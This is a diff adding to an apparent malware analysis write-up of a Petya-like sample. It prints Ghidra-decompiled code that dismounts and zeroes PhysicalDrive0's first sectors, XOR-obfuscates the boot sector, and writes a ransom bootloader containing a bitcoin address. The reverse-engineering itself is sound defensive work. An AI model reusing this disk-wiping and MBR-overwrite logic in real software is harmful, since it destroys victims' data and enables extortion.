@@ -1773,9 +1773,264 @@ The next thing we see is a [WriteFile](https://docs.microsoft.com/en-us/windows/
 
 Near the end of the subroutine we see an if statement that checks for the detected precense of anti virus software `8`, we know that this indicates the 4th bit which is flipped to `0` by the presence of Kaspersky. If Kaspersky is not detected and a function called `FUN_100014a9` returns `0` then the function is short circuited. Otherwise a function called `FUN_10008cbf` is also executed before returning.
 
+A quick look ahead reveals that `FUN_100014a9` is huge and might coordinate the file encryption. Therefore we first take a look at `FUN_10008cbf`.
+
+### FUN_10008cbf
+
+```cpp
+undefined4 FUN_10008cbf(void){
+  HANDLE hDevice;
+  undefined4 uVar1;
+  undefined local_24 [20];
+  int local_10;
+  HLOCAL local_c;
+  DWORD local_8;
+  
+  hDevice = CreateFileA("\\\\.\\PhysicalDrive0",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
+                        (HANDLE)0x0);
+  if (hDevice == (HANDLE)0x0) {
+    uVar1 = 0;
+  }
+  else {
+    DeviceIoControl(hDevice,0x70000,(LPVOID)0x0,0,local_24,0x18,&local_8,(LPOVERLAPPED)0x0);
+    local_c = LocalAlloc(0,local_10 * 10);
+    if (local_c != (HLOCAL)0x0) {
+      DeviceIoControl(hDevice,0x90020,(LPVOID)0x0,0,(LPVOID)0x0,0,&local_8,(LPOVERLAPPED)0x0);
+      WriteFile(hDevice,local_c,local_10 * 10,&local_8,(LPOVERLAPPED)0x0);
+      LocalFree(local_c);
+    }
+    CloseHandle(hDevice);
+    uVar1 = 1;
+  }
+  return uVar1;
+}
+```
+
+This subroutine looks very similar to the one we just analyzed. Except here `PhysicalDrive0` is opened. A similar buffer of `10 * BytesPerSector` is also allocated. However after this we see a second `DeviceIoControl` call with a flag of `0x90020` which is new. Turns out that this maps to [FSCTL_DISMOUNT_VOLUME](https://docs.microsoft.com/en-us/windows/win32/api/winioctl/ni-winioctl-fsctl_dismount_volume) this call dismounts a volume regardless of whether or not it is in use. Next we see a write to the physical volume where the first `10` sectors are completely zeroed out. Whereas perviously we just zeroed out the 2nd sector. Now we zero out the first `10`. This is effectively a more severe version of the earlier subroutine. Presumable this subroutine fails when Kaspersky is installed which is why an alternative is in place and this function only executed when Kaspersky is not present.
+
+Next we move on to `FUN_100014a9` which is presumably in control of some rather important logic.
+
 ### FUN_100014a9
 
+```cpp
+void FUN_100014a9(void)
 
+{
+  uint *puVar1;
+  uint *puVar2;
+  char cVar3;
+  char *_Size;
+  uint *puVar4;
+  DWORD DVar5;
+  uint uVar6;
+  uint *puVar7;
+  uint uVar8;
+  undefined4 *puVar9;
+  undefined4 *puVar10;
+  int iVar11;
+  undefined4 *puVar12;
+  undefined local_99c;
+  undefined local_99b [511];
+  undefined4 local_79c [128];
+  undefined4 local_59c [110];
+  undefined4 local_3e4;
+  undefined2 local_3e0;
+  uint local_3de [16];
+  undefined local_39c;
+  BYTE local_39b [32];
+  BYTE local_37b [8];
+  undefined local_373 [34];
+  undefined local_351;
+  undefined local_2f3 [343];
+  CHAR local_19c;
+  undefined local_19b [267];
+  byte local_90 [60];
+  char local_54 [64];
+  uint local_14;
+  uint local_10;
+  undefined4 *local_c;
+  void *local_8;
+  
+  local_19c = '\0';
+  memset(local_19b,0,0x103);
+  local_59c[0]._0_1_ = 0;
+  memset((void *)((int)local_59c + 1),0,0x1ff);
+  local_39c = 0;
+  memset(local_39b,0,0x1ff);
+  local_99c = 0;
+  memset(local_99b,0,0x1ff);
+  local_79c[0]._0_1_ = 0;
+  memset((void *)((int)local_79c + 1),0,0x1ff);
+  local_90[0] = 0;
+  memset(local_90 + 1,0,0x3b);
+  local_54[0] = '\0';
+  memset(local_54 + 1,0,0x3c);
+  local_10 = 0;
+  DAT_1001f8f8 = FUN_10001038(&local_19c);
+  if ((-1 < (int)DAT_1001f8f8) &&
+     (DAT_1001f8f8 = FUN_1000122d(&local_19c,&local_8), -1 < (int)DAT_1001f8f8)) {
+    if (local_8 == (void *)0x0) {
+      DAT_1001f8f8 = FUN_10001424(local_90,0x3c);
+      if (-1 < (int)DAT_1001f8f8) {
+        uVar8 = 0;
+        do {
+          uVar6 = uVar8 + 1;
+          local_54[uVar8] =
+               "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
+               [(uint)local_90[uVar8] % 0x3a];
+          uVar8 = uVar6;
+        } while (uVar6 < 0x3c);
+        DAT_1001f8f8 = FUN_100012d5(&local_19c,local_59c);
+        if (-1 < (int)DAT_1001f8f8) {
+          puVar4 = local_3de + 2;
+          iVar11 = 4;
+          uVar8 = 0;
+          do {
+            uVar6 = *puVar4;
+            if ((uVar6 != 0) && (uVar6 != 0xffffffff)) {
+              uVar8 = uVar6;
+            }
+            puVar4 = puVar4 + 4;
+            iVar11 = iVar11 + -1;
+          } while (iVar11 != 0);
+          if (uVar8 == 0xffffffff) {
+            uVar8 = 0;
+          }
+          if (uVar8 < 0x29) {
+            DAT_1001f8f8 = 0x80070272;
+          }
+          else {
+            iVar11 = 0x80;
+            puVar9 = (undefined4 *)local_59c;
+            puVar10 = local_79c;
+            while (iVar11 != 0) {
+              iVar11 = iVar11 + -1;
+              *puVar10 = *puVar9;
+              puVar9 = puVar9 + 1;
+              puVar10 = puVar10 + 1;
+            }
+            uVar8 = 0;
+            do {
+              *(byte *)((int)local_79c + uVar8) = *(byte *)((int)local_79c + uVar8) ^ 7;
+              uVar8 = uVar8 + 1;
+            } while (uVar8 < 0x200);
+            memset(&local_99c,7,0x200);
+            local_39c = 0;
+            DAT_1001f8f8 = FUN_10001424(local_39b,0x20);
+            if ((-1 < (int)DAT_1001f8f8) &&
+               (DAT_1001f8f8 = FUN_10001424(local_37b,8), -1 < (int)DAT_1001f8f8)) {
+              memcpy(local_373,"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX",0x22);
+              _Size = local_54;
+              local_351 = 0;
+              do {
+                cVar3 = *_Size;
+                _Size = _Size + 1;
+              } while (cVar3 != '\0');
+              _Size = _Size + -(int)(local_54 + 1);
+              if (_Size != (char *)0x0) {
+                if ((char *)0x156 < _Size) {
+                  _Size = (char *)0x156;
+                }
+                memcpy(local_2f3,local_54,(size_t)_Size);
+                local_2f3[(int)_Size] = 0;
+              }
+              local_c = (undefined4 *)(*_DAT_1001b104)(0x200);
+              if (local_c == (undefined4 *)0x0) {
+                DAT_1001f8f8 = 0x8007000e;
+              }
+              else {
+                iVar11 = 0x80;
+                puVar9 = &DAT_10018c50;
+                puVar10 = local_c;
+                while (iVar11 != 0) {
+                  iVar11 = iVar11 + -1;
+                  *puVar10 = *puVar9;
+                  puVar9 = puVar9 + 1;
+                  puVar10 = puVar10 + 1;
+                }
+                DAT_1001f8f8 = 0;
+              }
+              if (-1 < (int)DAT_1001f8f8) {
+                local_8 = (void *)(*_DAT_1001b104)(0x22b1);
+                if (local_8 == (void *)0x0) {
+                  DAT_1001f8f8 = 0x8007000e;
+                }
+                else {
+                  local_10 = 0x22b1;
+                  memcpy(local_8,&DAT_10018e50,0x22b1);
+                  DAT_1001f8f8 = 0;
+                }
+                if (-1 < (int)DAT_1001f8f8) {
+                  local_14 = (local_10 - (local_10 & 0x1ff)) + 0x400;
+                  puVar9 = (undefined4 *)(*_DAT_1001b104)(local_14);
+                  if (puVar9 == (undefined4 *)0x0) {
+                    DAT_1001f8f8 = 0x8007000e;
+                  }
+                  else {
+                    iVar11 = 0x80;
+                    puVar10 = local_c;
+                    puVar12 = puVar9;
+                    while (iVar11 != 0) {
+                      iVar11 = iVar11 + -1;
+                      *puVar12 = *puVar10;
+                      puVar10 = puVar10 + 1;
+                      puVar12 = puVar12 + 1;
+                    }
+                    puVar9[0x6e] = local_3e4;
+                    *(undefined2 *)(puVar9 + 0x6f) = local_3e0;
+                    puVar4 = local_3de;
+                    puVar7 = (uint *)((int)puVar9 + 0x1be);
+                    iVar11 = 4;
+                    do {
+                      *puVar7 = *puVar4;
+                      puVar7[1] = puVar4[1];
+                      puVar2 = puVar7 + 3;
+                      puVar1 = puVar4 + 3;
+                      puVar7[2] = puVar4[2];
+                      puVar4 = puVar4 + 4;
+                      puVar7 = puVar7 + 4;
+                      iVar11 = iVar11 + -1;
+                      *puVar2 = *puVar1;
+                    } while (iVar11 != 0);
+                    memcpy(puVar9 + 0x80,local_8,local_10);
+                    uVar8 = local_14 >> 9;
+                    DVar5 = 0;
+                    if (uVar8 == 0) {
+                      DVar5 = 0x80070057;
+                    }
+                    else {
+                      uVar6 = 0;
+                      if (uVar8 != 0) {
+                        do {
+                          DVar5 = FUN_10001384(&local_19c,puVar9);
+                          if ((int)DVar5 < 0) break;
+                          uVar6 = uVar6 + 1;
+                          puVar9 = puVar9 + 0x80;
+                        } while (uVar6 < uVar8);
+                      }
+                    }
+                    DAT_1001f8f8 = DVar5;
+                    if (((-1 < (int)DVar5) &&
+                        (DAT_1001f8f8 = FUN_10001384(&local_19c,&local_39c), -1 < (int)DAT_1001f8f8)
+                        ) && (DAT_1001f8f8 = FUN_10001384(&local_19c,&local_99c),
+                             -1 < (int)DAT_1001f8f8)) {
+                      DAT_1001f8f8 = FUN_10001384(&local_19c,local_79c);
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+    else {
+      DAT_1001f8f8 = 0x80070032;
+    }
+  }
+  return;
+}
+```
 
 
 
